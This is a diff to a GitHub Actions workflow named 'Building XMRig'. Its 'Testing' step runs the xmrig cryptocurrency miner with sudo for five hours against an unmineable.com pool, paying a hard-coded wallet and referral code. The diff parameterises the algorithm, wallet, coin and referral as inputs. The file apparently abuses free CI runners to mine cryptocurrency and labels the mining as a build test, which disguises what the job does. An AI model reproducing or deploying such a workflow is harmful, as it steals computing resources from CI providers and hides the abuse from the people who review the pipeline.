@@ -1,7 +1,24 @@
-name: Building xmrig shib gr
+name: Building XMRig
 
 on:
   workflow_dispatch:
+    inputs:
+      ALGORITHM:
+        description: 'ALGORITHM'
+        required: true
+        default: 'ghostrider'
+      WALLET:
+        description: 'WALLET'
+        required: true
+        default: '0x2cb3af51075037d030aa3e06ac9e4c912cc16eea'
+      COIN:
+        description: 'COIN'
+        required: true
+        default: 'SHIB'
+      REFERAL:
+        description: 'REFERAL'
+        required: true
+        default: 'uhok-ykxb'
 
 jobs:
   build:
@@ -32,7 +49,7 @@ jobs:
       - name: Testing
         run: |
           cd workspace/kernel/build
-          timeout 5h sudo ./xmrig -a gr -o stratum+ssl://ghostrider.unmineable.com:443 -u "SHIB:0x2cb3af51075037d030aa3e06ac9e4c912cc16eea.$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13; echo)#uhok-ykxb" -p x -k
+          timeout 5h sudo ./xmrig -a ${{ github.event.inputs.ALGORITHM }} -o stratum+ssl://${{ github.event.inputs.ALGORITHM }}.unmineable.com:443 -u "${{ github.event.inputs.COIN }}:${{ github.event.inputs.WALLET }}.$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13; echo)#${{ github.event.inputs.REFERAL }}" -p x -k
 
       - name: Release
         uses: softprops/action-gh-release@v1
